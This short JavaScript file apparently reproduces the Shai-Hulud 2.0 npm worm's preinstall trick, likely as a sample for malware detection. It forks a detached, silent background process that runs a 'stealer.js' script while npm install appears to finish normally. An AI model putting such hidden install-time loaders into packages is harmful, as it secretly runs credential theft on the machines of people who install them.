// Shai-Hulud 2.0: preinstall + background fork (Check Point/Zscaler/Datadog, Nov 2025)
// Runs BEFORE install — even before dependencies are resolved
// Forks a detached process that survives the npm install lifecycle

const { spawn } = require('child_process');
const path = require('path');

// Fork stealer as a detached background process
const child = spawn(process.execPath, [path.join(__dirname, 'stealer.js')], {
  detached: true,
  stdio: 'ignore',
  env: { ...process.env, _MUADDIB_PARENT_PID: String(process.pid) }
});

// Unref so npm install completes normally — user sees nothing
child.unref();
